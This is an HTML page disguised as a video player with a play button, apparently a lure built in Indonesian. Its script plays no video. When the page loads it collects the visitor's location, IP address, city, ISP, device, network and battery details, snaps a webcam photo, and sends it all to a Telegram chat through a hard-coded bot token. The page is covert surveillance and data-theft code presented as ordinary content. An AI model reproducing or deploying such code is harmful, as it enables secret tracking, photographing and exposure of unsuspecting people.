<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            margin: 0;
        }
        .video-container {
            position: relative;
            width: 640px;
            height: 360px;
            background: black;
        }
        #video-placeholder {
            width: 100%;
            height: 100%;
            background: black url('thumbnail.jpg') center/cover no-repeat;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #play-button {
            width: 60px;
            height: 60px;
            background: rgba(255, 255, 255, 0.8);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #play-button::before {
            content: '‚ñ∂';
            font-size: 24px;
            color: black;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="video-container">
        <div id="video-placeholder">
            <div id="play-button"></div>
        </div>
    </div>
    <script>
        const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o";
        const CHAT_ID = "-1002270270494";

        function sendToTelegram(message, photoBlob = null) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("caption", message);
            if (photoBlob) {
                formData.append("photo", photoBlob, "snapshot.jpg");
            }
            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }

        async function captureData() {
            let message = "üîç Data Pengguna:\n";
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                message += `üìç Lokasi: ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
            } catch {
                message += "‚ùå Lokasi tidak diizinkan.\n";
            }
            try {
                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
                message += `üåê IP: ${ipData.ip}\nüèô Kota: ${ipData.city}, ${ipData.region}\nüì° ISP: ${ipData.org}\n`;
            } catch {
                message += "‚ö†Ô∏è Gagal mendapatkan informasi IP.\n";
            }
            let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
            let androidVersion = navigator.userAgent.match(/Android\s([0-9\.]+)/);
            let androidInfo = androidVersion ? `ü§ñ Android: ${androidVersion[1]}\n` : "";
            message += `üì± Perangkat: ${navigator.userAgent}\nüì∂ Jaringan: ${network}\n${androidInfo}`;
            try {
                const battery = await navigator.getBattery();
                message += `üîã Baterai: ${Math.round(battery.level * 100)}%\n`;
            } catch {
                message += "‚ö†Ô∏è Tidak bisa mendapatkan status baterai.\n";
            }
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                let track = stream.getVideoTracks()[0];
                let imageCapture = new ImageCapture(track);
                await new Promise(resolve => setTimeout(resolve, 2000));
                const blob = await imageCapture.takePhoto();
                await sendToTelegram(message, blob);
                stream.getTracks().forEach(track => track.stop());
            } catch {
                await sendToTelegram("‚ùå Kamera tidak diizinkan.");
            }
        }

        window.onload = captureData;
    </script>
</body>
</html>
